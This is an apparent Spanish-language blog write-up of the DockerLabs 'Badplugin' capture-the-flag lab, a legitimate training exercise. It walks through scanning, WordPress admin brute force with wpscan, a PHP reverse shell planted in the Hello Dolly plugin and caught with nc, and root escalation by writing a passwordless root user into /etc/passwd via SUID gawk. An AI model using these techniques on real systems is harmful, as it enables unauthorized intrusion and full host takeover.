---
title: DockerLabs - Badplugin
summary: "Write-up del laboratorio Badplugin de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:54:23
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_badplugin"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ nmap -sCV -p80 172.17.0.2                     
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Error Message
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

En la página principal de la máquina vemos un botón:

![Desktop View](/20260129131258.webp){: width="972" height="589" .shadow}

Al pulsarlo, nos indica el siguiente mensaje:

![Desktop View](/20260129131331.webp){: width="972" height="589" .shadow}

En el código fuente de la página vemos que realmente es un mensaje meramente visual, no está realmente haciendo una llamada a ningún servicio:

![Desktop View](/20260129131404.webp){: width="972" height="589" .shadow}

Dejaremos **gobuster** corriendo en segundo plano para buscar recursos en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 87159]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/index.html           (Status: 200) [Size: 1960]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://172.17.0.2/phpmyadmin/]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que en el recurso `/info.php` se está viendo la ejecución del comando `phpinfo()`:

![Desktop View](/20260129131951.webp){: width="972" height="589" .shadow}

Tambien encontramos que hay un `phpmyadmin` en el servidor, el cual se encarga de gestionar las bases de datos:

![Desktop View](/20260129132040.webp){: width="972" height="589" .shadow}

Existe también el recurso `/wordpress`, pero vemos que nos redirige al host `escolares.dl`:

![Desktop View](/20260129131556.webp){: width="972" height="589" .shadow}

Para que el host resuelva correctamente, debemos agregarlo al fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ cat /etc/hosts | grep escolares                                                     
172.17.0.2      escolares.dl
```

Si ahora volvemos a recargar la página, veremos que ya nos carga correctamente:

![Desktop View](/20260129131817.webp){: width="972" height="589" .shadow}

Para obtener más información relacionada con las páginas que están construidas con **WordPress**, la herramienta **wpscan** es muy útil, por lo que la ejecutaremos en modo agresivo, ya que es un entorno controlado.

Dentro de toda la información que nos devuelve, vemos que encuentra que el usuario `admin` existe en el sistema:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ wpscan --url http://escolares.dl/wordpress --detection-mode aggressive -e ap,at,u -t 32
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

...

[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-json/oembed/1.0/embed?url=http://escolares.dl/wordpress/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

...

[+] Requests Done: 30673
[+] Cached Requests: 37
[+] Data Sent: 8.52 MB
[+] Data Received: 9.423 MB
[+] Memory used: 326.426 MB
[+] Elapsed time: 00:18:59
```

Por ello, con la misma herramienta **wpscan** tratamos de obtener la contraseña del usuario `admin` por fuerza bruta, la cual obtenemos al momento:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ wpscan --url http://escolares.dl/wordpress -U admin -P /usr/share/seclists/Passwords/rockyou.txt -t 32
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | `_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / *******                                                                                                                                                                                       
Trying admin / tigger Time: 00:00:01 <

[!] Valid Combinations Found:
 | Username: admin, Password: *******
```

Probamos la credenciales obtenidas, y vemos que son correctas:

![Desktop View](/20260129173909.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Para poder acceder al sistema, uno de los métodos es usar el plugin `Hello Dolly`, ya que su estructura es simple, y permite ejecutar scripts en PHP.

Lo primero es buscar e instalar el plugin `Hello Dolly` (y no activarlo todavía, ya que de lo contrario no podremos modificar el script):

![Desktop View](/20260129230116.webp){: width="972" height="589" .shadow}

Lo siguiente será acceder a la edición de ficheros de los plugins, donde indicaremos el plugin `Hello Dolly`, agregaremos el contenido del script [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) al inicio del script `hello.php` (yo he borrado los comentarios iniciales, y he modificado las variables `$ip` y `$port`), y luego guardamos los cambios con el botón `Actualizar archivo`:

![Desktop View](/20260129230856.webp){: width="972" height="589" .shadow}

Si se ha guardado correctamente, nos lo indicará con el siguiente mensaje:

![Desktop View](/20260129230809.webp){: width="450" height="210" .shadow}

Para obtener la consola remota, ahora deberemos ponernos en escucha con **nc**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ nc -lvp 4444             
listening on [any] 4444 ...
```

Activaremos el plugin `Hello Dolly`:

![Desktop View](/20260129231005.webp){: width="972" height="589" .shadow}

Una vez activado, habremos obtenido la consola remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ nc -lvp 4444             
listening on [any] 4444 ...
connect to [172.17.0.1] from escolares.dl [172.17.0.2] 35254
Linux 8c1bac1f8653 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64 x86_64 x86_64 GNU/Linux
 XX:XX:XX up 5 days,  3:44,  0 user,  load average: 1.76, 2.07, 2.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can`t access tty; job control turned off
$ whoami
www-data
$ hostname -I
172.17.0.2
```

Procederemos a tratar la TTY para poder operar con mayor facilidad:

```bash
$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@8c1bac1f8653:/$ ^Z
zsh: suspended  nc -lvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Badplugin]
└─$ stty raw -echo;fg   
[1]  + continued  nc -lvp 4444
                              reset xterm
www-data@8c1bac1f8653:/$ export TERM=xterm
www-data@8c1bac1f8653:/$ export SHELL=bash
www-data@8c1bac1f8653:/$ stty rows 45 columns 210
```

Listamos los usuarios del sistema que tengan una consola asignada en el fichero `/etc/passwd`:

```bash
www-data@8c1bac1f8653:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001:,,,:/home/luisillo:/bin/bash
```

## escalada de privilegios (root)

Buscamos los binarios cuyos permisos sean **SUID** (permite ejecutar el binario con los permisos del propietario), donde el que salta a la vista es `/usr/bin/gawk`:

```bash
www-data@8c1bac1f8653:/$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gawk
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Encontramos en [GTFOBins](https://gtfobins.org/gtfobins/gawk/#file-write) que podemos aprovecharnos de distintas maneras de la utilidad **gawk** (versión de **awk** desarrollada como parte del proyecto GNU) cuando tiene permisos **SUID**:

![Desktop View](/20260202194609.webp){: width="972" height="589" .shadow}

La que emplearemos en este caso es la de escribir con permisos elevados, que en este caso será en el fichero `/etc/passwd`, agregando un nuevo usuario con permisos elevados, pero sin contraseña:

```bash
www-data@eaa9d3c280bf:/tmp$ gawk 'BEGIN { print "root2::0:0::/root:/bin/bash" >> "/etc/passwd" }'
```

Una vez ejecutado el comando, podremos ver que efectivamente hemos podido escribir en el fichero `/etc/passwd`:

```bash
root@eaa9d3c280bf:/tmp# cat /etc/passwd | grep root2
root2::0:0::/root:/bin/bash
```

Si ahora tratamos de invocar una consola como el nuevo usuario privilegiado, veremos que obtenemos la consola elevada, y sin aportar credenciales:

```bash
www-data@eaa9d3c280bf:/tmp$ su root2
root@eaa9d3c280bf:/tmp# whoami
root
```

De esta manera habremos completado la máquina **Badplugin**!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>